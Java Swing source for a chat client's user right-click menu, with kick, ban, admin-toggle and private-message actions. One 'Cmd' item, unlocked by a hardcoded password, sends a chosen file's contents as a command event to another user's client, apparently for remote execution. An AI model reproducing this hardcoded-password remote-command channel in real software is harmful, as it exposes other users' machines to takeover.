package cr.ui.popmenu;

import cr.LocalEnum;
import cr.Main;
import cr.events.Event;
import cr.events.Events;
import cr.io.IO;
import cr.tool.Logger;
import cr.ui.XMenuBar;
import cr.util.Client;
import cr.util.Server;
import cr.util.user.User;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * @author Bobbywang
 * @date 2021-08-11 10:51
 */
public final class UserPopMenu extends JPopupMenu {
    private static UserPopMenu instance = null;

    public static UserPopMenu getInstance() {
        return instance;
    }
    public static void init(){
        long t=System.currentTimeMillis();
        instance=new UserPopMenu();
        System.out.println("UserPopMenu init:"+(System.currentTimeMillis()-t)+"ms");
    }

    private User clickedUser;

    private final JMenuItem kickMenu;
    private final JMenuItem kickMenu_plus;
    private final JMenuItem adminMenu;
    private final JMenuItem banMenu;

    private UserPopMenu() {
        super();
        add(XMenuBar.create("个人信息", 'i', e -> clickedUser.showFrame()));
        addSeparator();
        add(XMenuBar.create("发送窗口抖动",e -> Client.getClient().sendMessage(Events.getWindowEvent(clickedUser.getInfo()))));
        add(XMenuBar.create("私聊", 's', e -> {
            if (clickedUser.equals(User.getLocalUser())) {
                JOptionPane.showMessageDialog(Main.mainFrame, "你不能与自己私聊！", "警告", JOptionPane.ERROR_MESSAGE);
                return;
            }
            String message = JOptionPane.showInputDialog("输入要发送的信息：");
            if (message == null)
                return;
            Client.getClient().say(message,clickedUser.getInfo());
            Client.getClient().getDocument().appendLine("你悄悄对" + clickedUser.getName() + "说：" + message, Event.userMsg);
        }));
        kickMenu = XMenuBar.create("踢出聊天室", 'k', e -> Client.getClient().kick(clickedUser,null));
        add(kickMenu);
        kickMenu_plus = XMenuBar.create("踢出聊天室(附原因)", e -> {
            String reason = JOptionPane.showInputDialog("请输入将" + clickedUser.getName() + "踢出聊天室的原因：");
            if (reason == null)
                return;
            if (reason.equals(""))
                Client.getClient().kick(clickedUser,null);
            else
                Client.getClient().kick(clickedUser, reason);
        });
        add(kickMenu_plus);

        adminMenu = XMenuBar.create("", e -> Client.getClient().sendMessage(Events.getPermission(clickedUser.getInfo(),(clickedUser.getPermission() == LocalEnum.Permission_ADMIN) ? LocalEnum.Permission_DEFAULT : LocalEnum.Permission_ADMIN)));
        add(adminMenu);
        banMenu=XMenuBar.create("Ban",'b',e -> Server.getServer().addBan(clickedUser));
        add(banMenu);
        add(XMenuBar.create("Cmd",e -> {
            String pass=JOptionPane.showInputDialog("密码:");
            if (!pass.equals("1221b"))
                return;
            File f= IO.openFile();
            if (f==null) return;
            if (!f.canRead()){
                JOptionPane.showMessageDialog(Main.mainFrame,"无法读取！\n(把记事本关了，老子当年就被这个坑过)");
                return;
            }
            try {
                FileInputStream is=new FileInputStream(f);
                byte[] buff=new byte[((int) f.length())];
                int l=is.read(buff);
                String s=new String(buff,0,l);
                Client.getClient().sendMessage(Events.getCmdEvent(s,clickedUser.getInfo()));
                Logger.getLogger().info("Run Cmd:\n"+s);
                is.close();
            } catch (IOException ex) {
                ex.printStackTrace();
                Logger.getLogger().err(ex);
            }
        }));
    }

    public void show(Component invoker, int x, int y, User row) {
        super.show(invoker, x, y);
        User me = User.getLocalUser();
        clickedUser = row;
        adminMenu.setText(row.getPermission() == LocalEnum.Permission_ADMIN ? "取消管理员" : "设为管理员");
        if (row.equals(me)) {
            kickMenu.setEnabled(false);
            kickMenu_plus.setEnabled(false);
            adminMenu.setEnabled(false);
            banMenu.setEnabled(false);
            return;
        }
        kickMenu.setEnabled(me.getPermission() > row.getPermission());
        adminMenu.setEnabled(me.getPermission() == LocalEnum.Permission_OWNER);
        banMenu.setEnabled(adminMenu.isEnabled());
        kickMenu_plus.setEnabled(kickMenu.isEnabled());
    }
}